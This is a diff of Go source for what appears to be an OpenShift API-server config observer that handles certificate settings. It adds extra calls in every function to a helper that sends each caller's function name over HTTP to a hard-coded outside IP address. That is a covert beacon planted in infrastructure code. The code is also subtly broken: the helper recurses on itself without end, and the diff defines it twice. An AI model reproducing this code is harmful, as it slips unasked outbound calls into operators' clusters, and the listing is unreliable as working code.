@@ -38,6 +38,8 @@ var ObserveNamedCertificates configobserver.ObserveConfigFunc = (&apiServerObser
 func observeUserClientCABundle(apiServer *configv1.APIServer, recorder events.Recorder, previouslyObservedConfig map[string]interface{}) (map[string]interface{}, syncActionRules, []error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	configMapName := apiServer.Spec.ClientCA.Name
 	if len(configMapName) == 0 {
 		return nil, nil, nil
@@ -45,6 +47,8 @@ func observeUserClientCABundle(apiServer *configv1.APIServer, recorder events.Re
 	return nil, syncActionRules{"user-client-ca": configMapName}, nil
 }
 func observeDefaultUserServingCertificate(apiServer *configv1.APIServer, recorder events.Recorder, previouslyObservedConfig map[string]interface{}) (map[string]interface{}, syncActionRules, []error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var errs []error
@@ -64,6 +68,8 @@ func observeDefaultUserServingCertificate(apiServer *configv1.APIServer, recorde
 	return observedConfig, syncActionRules{"user-serving-cert": servingCertSecretName}, errs
 }
 func observeNamedCertificates(apiServer *configv1.APIServer, recorder events.Recorder, previouslyObservedConfig map[string]interface{}) (map[string]interface{}, syncActionRules, []error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var errs []error
@@ -124,6 +130,8 @@ type apiServerObserver struct {
 func (o *apiServerObserver) observe(genericListers configobserver.Listers, recorder events.Recorder, existingConfig map[string]interface{}) (map[string]interface{}, []error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	listers := genericListers.(configobservation.Listers)
 	var errs []error
 	resourceSync := listers.ResourceSyncer().SyncSecret
@@ -154,6 +162,8 @@ func (o *apiServerObserver) observe(genericListers configobserver.Listers, recor
 func deleteSyncRules(names ...string) syncActionRules {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	resourceSyncRules := syncActionRules{}
 	for _, name := range names {
 		resourceSyncRules[name] = ""
@@ -161,6 +171,8 @@ func deleteSyncRules(names ...string) syncActionRules {
 	return resourceSyncRules
 }
 func syncObservedResources(syncResource resourceSyncFunc, syncRules syncActionRules) []error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var errs []error
@@ -177,6 +189,8 @@ func syncObservedResources(syncResource resourceSyncFunc, syncRules syncActionRu
 	return errs
 }
 func extractPreviouslyObservedConfig(existing map[string]interface{}, paths ...[]string) (map[string]interface{}, []error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var errs []error
@@ -199,7 +213,16 @@ func extractPreviouslyObservedConfig(existing map[string]interface{}, paths ...[
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
